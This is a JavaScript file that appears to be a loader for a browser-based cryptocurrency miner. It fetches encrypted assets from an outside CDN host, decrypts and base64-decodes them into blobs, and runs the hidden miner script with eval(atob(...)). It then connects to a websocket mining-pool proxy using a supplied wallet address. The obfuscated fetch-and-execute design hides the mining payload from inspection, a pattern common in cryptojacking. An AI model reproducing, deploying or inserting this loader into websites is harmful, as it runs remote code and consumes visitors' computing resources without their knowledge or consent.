window._windowConfig = {
	proxybaseuri : "wss://wss.nablabee.com:2053",
	cdnbaseuri : "https://cdn.nablabee.com/assets.json"
}

function b64toBlob(b64Data, contentType, sliceSize) {
	contentType = contentType || '';
	sliceSize = sliceSize || 512;
  
	var byteCharacters = atob(b64Data);
	var byteArrays = [];
  
	for (var offset = 0; offset < byteCharacters.length; offset += sliceSize) {
	  var slice = byteCharacters.slice(offset, offset + sliceSize);
  
	  var byteNumbers = new Array(slice.length);
	  for (var i = 0; i < slice.length; i++) {
		byteNumbers[i] = slice.charCodeAt(i);
	  }
  
	  var byteArray = new Uint8Array(byteNumbers);
  
	  byteArrays.push(byteArray);
	}
  
	var blob = URL.createObjectURL(new Blob(byteArrays, {type: contentType}));
	return blob;
  }

function randomKey() {
	var text = "";
	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for (var i = 0; i < 10; i++)
	  text += possible.charAt(Math.floor(Math.random() * possible.length));
	return text;
  }

function loadEncryptedAssets(handler) {
	var xmlhttp = new XMLHttpRequest();
	var sessionKey = randomKey()
    xmlhttp.onreadystatechange = function() {
        if (xmlhttp.readyState == XMLHttpRequest.DONE) { 
           if (xmlhttp.status == 200) {
			   var assets = {}
			   var rawassets = JSON.parse(xmlhttp.responseText)
			   for(var key in rawassets){
				   assets[key] = CryptoJS.AES.decrypt(rawassets[key].blob, rawassets[key].key).toString(CryptoJS.enc.Utf8) 
			   }
			   handler(assets)
           }
           else {
               throw "XMLHTTP ERROR"
           }
        }
	}
    xmlhttp.open("GET", window._windowConfig.cdnbaseuri, true);
    xmlhttp.send();
}



function loadMiner(args, handler){
	if(args.worker === undefined)
		args.worker = "x"
	if(args.address === undefined || args.address == "")
		throw "Address needed"
	if(args.options === undefined)
		args.options = {}

	window._windowConfig.proxyUrl = window._windowConfig.proxybaseuri+"?pool="+args.pool
	loadEncryptedAssets(function(assets){
		window._windowConfig.wasm_blob = b64toBlob(assets.cwasm)
		window._windowConfig.ajs = b64toBlob(assets.ajs)
		window._windowConfig.amem = b64toBlob(assets.amem)
		eval(atob(assets.mjs))
		var lover = WindowCoolWrapper.User(args.address, args.worker, args.options)
		handler(lover)
	})
}